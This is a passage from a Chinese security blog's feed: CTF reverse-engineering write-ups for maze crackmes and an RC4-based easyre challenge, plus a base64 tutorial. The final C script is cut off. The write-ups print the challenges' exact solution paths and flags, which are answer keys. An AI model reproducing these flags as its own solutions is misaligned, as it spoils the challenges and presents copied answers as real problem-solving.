class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*******+**</span><br><span class="line">******* **</span><br><span class="line">****    **</span><br><span class="line">**   *****</span><br><span class="line">** **F****</span><br><span class="line">**    ****</span><br><span class="line">**********</span><br></pre></td></tr></table></figure><p>所以 flag 就为<strong> flag {ssaaasaassdddw}</strong></p><p>题目来源：<a href="https://buuoj.cn/challenges#%5BHDCTF2019%5DMaze">BUUCTF 在线评测 (buuoj.cn)</a>——[HDCTF2019]Maze</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020华南师大CTF新生赛maze</title>
      <link href="/2022/04/15/2020%E5%8D%8E%E5%8D%97%E5%B8%88%E5%A4%A7CTF%E6%96%B0%E7%94%9F%E8%B5%9Bmaze/"/>
      <url>/2022/04/15/2020%E5%8D%8E%E5%8D%97%E5%B8%88%E5%A4%A7CTF%E6%96%B0%E7%94%9F%E8%B5%9Bmaze/</url>
      
        <content type="html"><![CDATA[<p>又是一道迷宫题，而且又是华南师大的新生赛题哈哈哈哈，这道题比 19 年的要难上不少哈哈哈</p><p>依然是 32 位无壳程序，用 ida pro 打开后查看主函数</p><img src="/2022/04/15/2020%E5%8D%8E%E5%8D%97%E5%B8%88%E5%A4%A7CTF%E6%96%B0%E7%94%9F%E8%B5%9Bmaze/1.png" class><p>可以看出它的关键部分依然是 check 函数</p><img src="/2022/04/15/2020%E5%8D%8E%E5%8D%97%E5%B8%88%E5%A4%A7CTF%E6%96%B0%E7%94%9F%E8%B5%9Bmaze/2.png" class><p>我们要做的还是一样的，要找出地图在哪里，正好这个 check 函数下面有一个 map 数组，估计就在这里面了，我们点进去看，可以看到 map=v2，然后 v2 又等于 num 数组</p><img src="/2022/04/15/2020%E5%8D%8E%E5%8D%97%E5%B8%88%E5%A4%A7CTF%E6%96%B0%E7%94%9F%E8%B5%9Bmaze/3.png" class><p>我点开 num 数组，发现里面有很多数字，并不符合函数中的 16 个循环，这里我很疑惑，然后参考了大佬的 wp 之后才知道我们可以用 ida 的本地调试来获取这 16 次循环的 v2 值，也就是 num 数组的值，操作如下</p><p>首先我们开启 debugger 中的 debugger windows，然后找到 createmap 函数的循环，做一个断点</p><img src="/2022/04/15/2020%E5%8D%8E%E5%8D%97%E5%B8%88%E5%A4%A7CTF%E6%96%B0%E7%94%9F%E8%B5%9Bmaze/4.png" class><p>然后按 F9 开始调试，按 F8 一步一步的走，首先程序会弹出来运行，我们要先随便输入一个数字进去才会开始运行 createmap 函数，所以我们先随便输入一个数字，再 F8 开始调试</p><img src="/2022/04/15/2020%E5%8D%8E%E5%8D%97%E5%B8%88%E5%A4%A7CTF%E6%96%B0%E7%94%9F%E8%B5%9Bmaze/5.png" class><p>我们要打开 windows debugger 中的 locals 来查看这个 v2 也就是 num 数组的值，我们要手动让他进行 16 次循环，然后得到 16 个数字，最终得到的数组如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num = [<span class="number">0xFFFF</span>, <span class="number">0x83F7</span>, <span class="number">0xBBF7</span>, <span class="number">0xBB17</span>, <span class="number">0xBB57</span>, <span class="number">0xB857</span>, <span class="number">0xBF57</span>, <span class="number">0xBF17</span>, <span class="number">0xBFB7</span>, <span class="number">0xBFB7</span>, <span class="number">0x8611</span>, <span class="number">0xF7B5</span>, <span class="number">0xF7B5</span>, <span class="number">0x7B4</span>, <span class="number">0xFF87</span>, <span class="number">0xFFFF</span>]</span><br></pre></td></tr></table></figure><p>不过在这里我想了很久，这怎么就是迷宫了呢，一对 16 进制的数字就是迷宫？不可能！再怎么说也要是 2 进制吧！然后我就用 python 把这 16 个数字全部转为 2 进制，发现真的可以，的出来的结果应该就是迷宫了！</p><img src="/2022/04/15/2020%E5%8D%8E%E5%8D%97%E5%B8%88%E5%A4%A7CTF%E6%96%B0%E7%94%9F%E8%B5%9Bmaze/6.png" class><p>不过，这倒数第三行少了几个数字，根据经验，在前面补 0 就行了，让它对齐，不过有的大佬的 wp 脚本跑出来前面就有 0，挺懵逼的我，我的只能自己补？</p><p>最后一步就开始走迷宫吧！咦？不对啊，wasd 走出来的结果根本不对！噢，原来是我忽略了一开始的 check 函数，我返回去看，发现这里面有这个迷宫真正的走法</p><img src="/2022/04/15/2020%E5%8D%8E%E5%8D%97%E5%B8%88%E5%A4%A7CTF%E6%96%B0%E7%94%9F%E8%B5%9Bmaze/7.png" class><p>不难看出，[13],[0] 这个位置就是起点了，终点就是 [13],[15] 了，这里有 l、k、h、j 四个字母，估计就是方向键了，也不难得出，k 是向上走，h 是向左走，j 是向下走，那 l 就是向右走了</p><img src="/2022/04/15/2020%E5%8D%8E%E5%8D%97%E5%B8%88%E5%A4%A7CTF%E6%96%B0%E7%94%9F%E8%B5%9Bmaze/8.png" class><p>最后依照这个路径走完迷宫就可以了，不过要记住是要走最短的路径噢！</p><img src="/2022/04/15/2020%E5%8D%8E%E5%8D%97%E5%B8%88%E5%A4%A7CTF%E6%96%B0%E7%94%9F%E8%B5%9Bmaze/9.png" class><p>（一开始我直接提交的路径，一直是 sorrrrrrrry~ 仔细看才发现它非要我们包上 flag {}，不过之前用 wasd 的时候也没包 flag… 挺无语的哈哈哈哈哈）</p><p>最终 flag：<strong>flag{llllkkkhhhkkkkkkkkklllljjjjllljjljjjjjjjlllkkkklljjjl}</strong></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019华南师大CTF新生赛maze</title>
      <link href="/2022/04/14/2019%E5%8D%8E%E5%8D%97%E5%B8%88%E5%A4%A7CTF%E6%96%B0%E7%94%9F%E8%B5%9Bmaze/"/>
      <url>/2022/04/14/2019%E5%8D%8E%E5%8D%97%E5%B8%88%E5%A4%A7CTF%E6%96%B0%E7%94%9F%E8%B5%9Bmaze/</url>
      
        <content type="html"><![CDATA[<p>这道题是本周的任务之一，是一道迷宫题，因为是华南师大的赛题我一开始以为很难，抱着试试的心态去做，没想到并没有我想象中的难，挺简单的哈哈哈哈，但可能有一点取巧了</p><p>首先检查程序，是一个 32 位的无壳程序，然后就是丢到 ida pro 中看主函数，然后可以看到以下这部分</p><img src="/2022/04/14/2019%E5%8D%8E%E5%8D%97%E5%B8%88%E5%A4%A7CTF%E6%96%B0%E7%94%9F%E8%B5%9Bmaze/1.jpg" class><p>它的关键部分就是我圈起来的这一部分，也就是这个 check 函数，同时它有一个条件是 flag 的长度要为 24 位，也就是说走出这个迷宫的路径就是 24，现在我们先查看一下 check 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __cdecl <span class="title function_">check</span><span class="params">(<span class="type">char</span> *flag)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> *cur; <span class="comment">// [esp+Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  cur = &amp;maze[<span class="number">14</span>];</span><br><span class="line">  <span class="keyword">while</span> ( *flag &amp;&amp; *cur != <span class="number">42</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = flag++;</span><br><span class="line">    v2 = *v1;</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++cur;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v2 &gt; <span class="number">100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v2 == <span class="number">115</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        cur += <span class="number">13</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v2 != <span class="number">119</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        cur -= <span class="number">13</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v2 != <span class="number">97</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      --cur;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> *cur == <span class="number">35</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中有一个 maze 数组，这应该就是我们的迷宫图了，我们点进去看，可以看到迷宫的组成</p><img src="/2022/04/14/2019%E5%8D%8E%E5%8D%97%E5%B8%88%E5%A4%A7CTF%E6%96%B0%E7%94%9F%E8%B5%9Bmaze/2.jpg" class><p>虽然有了它的组成部分，但是我并不知道它的格式是什么，从 check 函数来看，因为 @是第 14 位，所以我可以知道 @就是起点，终点都不用想，肯定是 #了，那么现在问题的关键就是要知道这个迷宫的格式，他肯定是个矩阵型的，这才符合一个标准的迷宫图形</p><p>这里我想到一个办法，就是把它复制粘贴到 word 文档中，看它有多少个字符，看会不会符合一个矩阵型，然后发现它一共有 169 个字符，我就想这不就是 13 的平方吗？于是我就赶紧操作起来，把它分为了一个 13×13 的迷宫，这就是它的格式了（也是我取巧的部分吧）</p><p>弄完之后就是长这个样子</p><img src="/2022/04/14/2019%E5%8D%8E%E5%8D%97%E5%B8%88%E5%A4%A7CTF%E6%96%B0%E7%94%9F%E8%B5%9Bmaze/3.jpg" class><p>然后我就以 @为起点，# 为终点来走迷宫（注意要是最短路径），然后走出了一个长度为 24 的路径，用 WASD 来表示上下左右，点开程序输入进去，发现是对的。不过这里有一点要注意一下，就是迷宫的每一步都要对齐，不要一下子就飘到另一个地方了，我一开始因为这样而错了好几次。</p><p>最后的结果如下</p><img src="/2022/04/14/2019%E5%8D%8E%E5%8D%97%E5%B8%88%E5%A4%A7CTF%E6%96%B0%E7%94%9F%E8%B5%9Bmaze/4.jpg" class><p>所以 flag 就是：<strong>flag{sssssdsssddsdddwwdwwaaaw}</strong></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入了解base64编码</title>
      <link href="/2022/04/13/%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3base64%E7%BC%96%E7%A0%81/"/>
      <url>/2022/04/13/%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3base64%E7%BC%96%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<p>平时 base64 的题目也有不少，生活中也是很常见的，但是每次遇到 base64 都是在网上找解码器直接一键解码，从没有去了解过它的具体实现过程，因为这周我们小组的任务要求深入了解 base64，才去真正的了解了 base64</p><h1 id="base64是什么"><a class="markdownIt-Anchor" href="#base64是什么">#</a> base64 是什么</h1><p>base64 是一种从二进制到文本的编码方式，而且编码后的结果只包含 ASCII 基础字符，值得注意的是，base64 并不能算是加密算法，只是一种编码方式，算法什么的都是公开的，所以不能依赖它来进行加密</p><p>为什么要叫做 base64 呢？是因为它的输出字符串是由 64 个可打印字符组成的，下面是它的索引表（来源于百度百科）</p><table><thead><tr><th style="text-align:center"></th><th style="text-align:center"></th><th style="text-align:center"></th><th style="text-align:center"></th><th style="text-align:center"></th><th style="text-align:center"></th><th style="text-align:center"></th><th style="text-align:center"></th></tr></thead><tbody><tr><td style="text-align:center"><strong>索引</strong></td><td style="text-align:center"><strong>对应字符</strong></td><td style="text-align:center"><strong>索引</strong></td><td style="text-align:center"><strong>对应字符</strong></td><td style="text-align:center"><strong>索引</strong></td><td style="text-align:center"><strong>对应字符</strong></td><td style="text-align:center"><strong>索引</strong></td><td style="text-align:center"><strong>对应字符</strong></td></tr><tr><td style="text-align:center">0</td><td style="text-align:center"><strong>A</strong></td><td style="text-align:center">17</td><td style="text-align:center"><strong>R</strong></td><td style="text-align:center">34</td><td style="text-align:center"><strong>i</strong></td><td style="text-align:center">51</td><td style="text-align:center"><strong>z</strong></td></tr><tr><td style="text-align:center">1</td><td style="text-align:center"><strong>B</strong></td><td style="text-align:center">18</td><td style="text-align:center"><strong>S</strong></td><td style="text-align:center">35</td><td style="text-align:center"><strong>j</strong></td><td style="text-align:center">52</td><td style="text-align:center"><strong>0</strong></td></tr><tr><td style="text-align:center">2</td><td style="text-align:center"><strong>C</strong></td><td style="text-align:center">19</td><td style="text-align:center"><strong>T</strong></td><td style="text-align:center">36</td><td style="text-align:center"><strong>k</strong></td><td style="text-align:center">53</td><td style="text-align:center"><strong>1</strong></td></tr><tr><td style="text-align:center">3</td><td style="text-align:center"><strong>D</strong></td><td style="text-align:center">20</td><td style="text-align:center"><strong>U</strong></td><td style="text-align:center">37</td><td style="text-align:center"><strong>l</strong></td><td style="text-align:center">54</td><td style="text-align:center"><strong>2</strong></td></tr><tr><td style="text-align:center">4</td><td style="text-align:center"><strong>E</strong></td><td style="text-align:center">21</td><td style="text-align:center"><strong>V</strong></td><td style="text-align:center">38</td><td style="text-align:center"><strong>m</strong></td><td style="text-align:center">55</td><td style="text-align:center"><strong>3</strong></td></tr><tr><td style="text-align:center">5</td><td style="text-align:center"><strong>F</strong></td><td style="text-align:center">22</td><td style="text-align:center"><strong>W</strong></td><td style="text-align:center">39</td><td style="text-align:center"><strong>n</strong></td><td style="text-align:center">56</td><td style="text-align:center"><strong>4</strong></td></tr><tr><td style="text-align:center">6</td><td style="text-align:center"><strong>G</strong></td><td style="text-align:center">23</td><td style="text-align:center"><strong>X</strong></td><td style="text-align:center">40</td><td style="text-align:center"><strong>o</strong></td><td style="text-align:center">57</td><td style="text-align:center"><strong>5</strong></td></tr><tr><td style="text-align:center">7</td><td style="text-align:center"><strong>H</strong></td><td style="text-align:center">24</td><td style="text-align:center"><strong>Y</strong></td><td style="text-align:center">41</td><td style="text-align:center"><strong>p</strong></td><td style="text-align:center">58</td><td style="text-align:center"><strong>6</strong></td></tr><tr><td style="text-align:center">8</td><td style="text-align:center"><strong>I</strong></td><td style="text-align:center">25</td><td style="text-align:center"><strong>Z</strong></td><td style="text-align:center">42</td><td style="text-align:center"><strong>q</strong></td><td style="text-align:center">59</td><td style="text-align:center"><strong>7</strong></td></tr><tr><td style="text-align:center">9</td><td style="text-align:center"><strong>J</strong></td><td style="text-align:center">26</td><td style="text-align:center"><strong>a</strong></td><td style="text-align:center">43</td><td style="text-align:center"><strong>r</strong></td><td style="text-align:center">60</td><td style="text-align:center"><strong>8</strong></td></tr><tr><td style="text-align:center">10</td><td style="text-align:center"><strong>K</strong></td><td style="text-align:center">27</td><td style="text-align:center"><strong>b</strong></td><td style="text-align:center">44</td><td style="text-align:center"><strong>s</strong></td><td style="text-align:center">61</td><td style="text-align:center"><strong>9</strong></td></tr><tr><td style="text-align:center">11</td><td style="text-align:center"><strong>L</strong></td><td style="text-align:center">28</td><td style="text-align:center"><strong>c</strong></td><td style="text-align:center">45</td><td style="text-align:center"><strong>t</strong></td><td style="text-align:center">62</td><td style="text-align:center"><strong>+</strong></td></tr><tr><td style="text-align:center">12</td><td style="text-align:center"><strong>M</strong></td><td style="text-align:center">29</td><td style="text-align:center"><strong>d</strong></td><td style="text-align:center">46</td><td style="text-align:center"><strong>u</strong></td><td style="text-align:center">63</td><td style="text-align:center"><strong>/</strong></td></tr><tr><td style="text-align:center">13</td><td style="text-align:center"><strong>N</strong></td><td style="text-align:center">30</td><td style="text-align:center"><strong>e</strong></td><td style="text-align:center">47</td><td style="text-align:center"><strong>v</strong></td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">14</td><td style="text-align:center"><strong>O</strong></td><td style="text-align:center">31</td><td style="text-align:center"><strong>f</strong></td><td style="text-align:center">48</td><td style="text-align:center"><strong>w</strong></td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">15</td><td style="text-align:center"><strong>P</strong></td><td style="text-align:center">32</td><td style="text-align:center"><strong>g</strong></td><td style="text-align:center">49</td><td style="text-align:center"><strong>x</strong></td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">16</td><td style="text-align:center"><strong>Q</strong></td><td style="text-align:center">33</td><td style="text-align:center"><strong>h</strong></td><td style="text-align:center">50</td><td style="text-align:center"><strong>y</strong></td><td style="text-align:center"></td><td style="text-align:center"></td></tr></tbody></table><p>其实也就是我们平常在做题过程中可以看见的一个数组”ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/“</p><p>废话不多说，直接开始了解它的编码过程吧</p><h1 id="编码过程"><a class="markdownIt-Anchor" href="#编码过程">#</a> 编码过程</h1><h2 id="字符串分组"><a class="markdownIt-Anchor" href="#字符串分组">#</a> 字符串分组</h2><p>将待转换的字符串每三个字节分为一组，每个字节占 8bit，一共是 24 个字节</p><p>这里我以我名字的首字母大写 TCH 为例，T、C、H 在 ASCII 码表中的位置分别是 84，67，72，而这三个数字的二进制码又分别为 1010100，1000011，1001000，不足八位的就在前面补 0，也就是 01010100，01000011，01001000，那么第一步就完成了</p><h2 id="二进制码分组"><a class="markdownIt-Anchor" href="#二进制码分组">#</a> 二进制码分组</h2><p>以上我们已经得到了一个 3×8=24 位的二进制码，我们还需要把这 24 位二进制码分为四组 6 位二进制码，也就是 010101，000100，001101，001000，就是从前面开始六位六位的去划分就可以了</p><h2 id="添0得到4字节"><a class="markdownIt-Anchor" href="#添0得到4字节">#</a> 添 0 得到 4 字节</h2><p>在这一步我们将以上得到的四组六位二进制码再在他们每组的前面添加两个 0，也就是 00010101，00000100，00001101，00001000，这样就得到了四组八位二进制码，也就得到了四个字节</p><h2 id="根据索引表得到具体的值"><a class="markdownIt-Anchor" href="#根据索引表得到具体的值">#</a> 根据索引表得到具体的值</h2><p>将以上得到的四个二进制数在我们的 base64 索引表中找到具体的值，其中 00010101=21=V，00000100=4=E，00001101=13=N，00001000=8=I</p><p>所以，TCH 最终的编码结果就是 VENI</p><p>光是文字说明可能不是很形象，这里用一个表格来呈现一下可能会更清晰</p><img src="/2022/04/13/%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3base64%E7%BC%96%E7%A0%81/1.png" class><p>这就是总体过程</p><h2 id="位数不足情况"><a class="markdownIt-Anchor" href="#位数不足情况">#</a> 位数不足情况</h2><p>有时候会有一些特殊情况，因为我举得例子恰好是三个字节，那有时候不足三个字节呢？那该如何处理？其实很简单，如果是两个字节，就一共有 16 个二进制位，还是按照规则进行分组，每六个一组的话，第三组会缺少 2 位，用 0 补齐即可得到三个 base64 编码，第四组完全没有数据的话就用”=“来补上，所以打个比方 “BC” 转换之后就是 “QKM=”</p><h1 id="注意事项"><a class="markdownIt-Anchor" href="#注意事项">#</a> 注意事项</h1><p>大多数编码都是由字符串转化成二进制的过程，而 Base64 的编码则是从二进制转换为字符串。与常规恰恰相反， Base64 编码主要用在传输、存储、表示二进制领域，不能算得上加密，只是无法直接看到明文。也可以通过打乱 Base64 编码来进行加密，在我之前刷题的过程中就有遇到过 base64 换表的题，就是将 base64 索引表的顺序打乱从而形成一个新表，再来进行编码的过程</p><h1 id="换表情况"><a class="markdownIt-Anchor" href="#换表情况">#</a> 换表情况</h1><p>在注意事项中有提到换表的情况，其实这个不难理解，我们正常的表是这样的”ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/“，我们可以随意的把它换成别的顺序，只要是 64 位就可以了，比如”123456789abcdefghijklmnopqrstuvwxyz+/ABCDEFGHIJKLMNOPQRSTUVWXYZ“，那么从 0 到 63 就是从 1 到 Z 的一个新表，中间的过程是一样的，只是最后索引部分需要从这个新表中进行索引即可，这就是换表的情况，因为之前刷题的时候遇到过所以这里就着重写一下，以后遇到还可以再看看</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF×SU2022-easyre</title>
      <link href="/2022/04/03/DASCTF%C3%97SU2022-easyre/"/>
      <url>/2022/04/03/DASCTF%C3%97SU2022-easyre/</url>
      
        <content type="html"><![CDATA[<h3 id="思路"><a class="markdownIt-Anchor" href="#思路">#</a> 思路</h3><p>这个程序是一个 32 位的程序，并且是带了 asp 的壳，我还不会手动去壳，所以就用工具把壳去掉了，下面看到主函数</p><img src="/2022/04/03/DASCTF%C3%97SU2022-easyre/1.png" class><p>在点进去第一个函数之后就很明显，这是个 RC4 算法的题，而且不难看出，这个 dword_492040 [i] 就是 S 表，在这我将它的名字改位 S [i]</p><img src="/2022/04/03/DASCTF%C3%97SU2022-easyre/2.png" class><p>在看第二个函数，也很明显，这个 v1 应该就是密钥了，用 v1 来填充 k 表，但是这里的填充规则是有些改动的，我们需要知道 sub_41A038 的值才能进行计算，我们先不管这个</p><img src="/2022/04/03/DASCTF%C3%97SU2022-easyre/3.png" class><p 54 49, 50, 51, 52, 53,>要注意的是，v1 密钥 “123456” 是字符串的形式，但我们填表是要用十进制的形式的，将 “123456” 转化为十进制之后是这样的</p><p>第三个函数是对 S 表的初始置换</p><img src="/2022/04/03/DASCTF%C3%97SU2022-easyre/4.png" class><p>第四个函数是计算新 K 表也就是密钥流，用来与明文进行异或运算的，这个 dword_492940 数组就是新 K 表</p><img src="/2022/04/03/DASCTF%C3%97SU2022-easyre/5.png" class><p>现在我们退出去，第一行有一个 v3，这个就是我们刚才需要知道的一个值，那它等于多少呢？根据逻辑关系，v3 的值是四个函数下面的 for 循环的限制条件（v3 也是明文的长度），也就是最后一步，即异或运算的循环次数，这个循环次数取决于 v2 数组的长度，而 v2 的长度是 42，所以 v3=42</p><p>在最后的 for 循环中，密文也就是 v2，等于 K 表的低位与明文进行异或然后再加 71，那么我们的脚本写出来就是把密文减 71 再与 K 表异或就是我们的明文了</p><h3 id="脚本"><a class="markdownIt-Anchor" href="#脚本">#</a> 脚本</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">int</span> s[<span class="number">256</span>];</span><br><span class="line"><span class="type">char</span> t[<span class="number">256</span>];</span><br><span class="line"><span class="type">int</span> k[<span class="number">50</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span>* a, <span class="type">int</span>* b)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint8_t</span> tmp;</span><br><span class="line">tmp = *a;</span><br><span class="line">*a = *b;</span><br><span class="line">*b = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Rc4_Init</span><span class="params">(<span class="type">uint8_t</span>* key, <span class="type">uint32_t</span> klen)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i, j;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">s[i] = i;</span><br><span class="line">t[i] = key[i % klen];</span><br><span class="line">&#125;</span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">j = (j + s[i] + t[i]) % <span class="number">256</span>;</span><br><span class="line">swap(&amp;s[i], &amp;s[j]);</span><br><span class="line">                             <span class="comment">//交换的函数(可以套用这个模板)</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> __cdecl <span class="title function_">sub_401619</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> v3; <span class="comment">// [esp+10h] [ebp-10h]</span></span><br><span class="line"><span class="type">int</span> v4; <span class="comment">// [esp+14h] [ebp-Ch]</span></span><br><span class="line"><span class="type">int</span> v5; <span class="comment">// [esp+18h] [ebp-8h]</span></span><br><span class="line"><span class="type">int</span> i; <span class="comment">// [esp+1Ch] [ebp-4h]</span></span><br><span class="line"><span class="type">int</span> a2 = <span class="number">42</span>;</span><br><span class="line">v4 = <span class="number">0</span>;</span><br><span class="line">v5 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; a2--; k[v4++] = s[(s[v5] + s[i]) % <span class="number">256</span>])</span><br><span class="line">&#123;</span><br><span class="line">i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">v5 = (v5 + s[i]) % <span class="number">256</span>;</span><br><span class="line">v3 = s[i] + <span class="number">66</span>;</span><br><span class="line">s[i] = s[v5] - <span class="number">33</span>;</span><br><span class="line">s[i] ^= <span class="number">2u</span>;</span><br><span class="line">s[v5] = <span class="number">5</span> * v3;</span><br><span class="line">s[v5] = s[i] - <span class="number">10</span>;</span><br><span class="line">s[v5] += s[i];</span><br><span class="line">s[i] -= <span class="number">18</span>;</span><br><span class="line">&#125;                             <span class="comment">//加密部分的函数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint8_t</span> v2[<span class="number">42</span>];</span><br><span class="line"><span class="type">uint8_t</span> ket[<span class="number">7</span>] = &#123;<span class="number">49</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">52</span>,<span class="number">53</span>,<span class="number">54</span>&#125;;</span><br><span class="line">Rc4_Init(ket, <span class="number">6</span>);</span><br><span class="line">sub_401619();</span><br><span class="line">v2[<span class="number">0</span>] = <span class="number">-61</span>;</span><br><span class="line">v2[<span class="number">1</span>] = <span class="number">-128</span>;</span><br><span class="line">v2[<span class="number">2</span>] = <span class="number">-43</span>;</span><br><span class="line">v2[<span class="number">3</span>] = <span class="number">-14</span>;</span><br><span class="line">v2[<span class="number">4</span>] = <span class="number">-101</span>;</span><br><span class="line">v2[<span class="number">5</span>] = <span class="number">48</span>;</span><br><span class="line">v2[<span 